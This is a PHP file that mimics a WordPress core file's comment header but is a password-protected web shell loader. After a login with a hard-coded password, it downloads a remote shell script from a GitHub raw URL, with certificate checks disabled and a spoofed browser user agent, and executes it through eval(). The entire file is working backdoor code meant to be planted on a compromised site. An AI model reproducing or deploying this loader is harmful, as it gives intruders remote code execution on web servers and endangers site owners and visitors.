<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];

    $hashed_password = md5('sipur');

    if (md5($entered_password) === $hashed_password) {
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = '123';
    } else {
        echo " ";
    }
}

if (is_logged_in()) {

    $a = geturlsinfo('https://raw.githubusercontent.com/fitwilliamx1337/f15-shell/refs/heads/main/f15.php');

    eval('?>' . $a);
} else {
?>
<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
</head>
<body>
    <form method="POST" action="">
        <label for="password">Password:</label>
        <input type="password" id="password" name="password">
        <input type="submit" value="Login">
    </form>
</body>
</html>
<?php
}
?>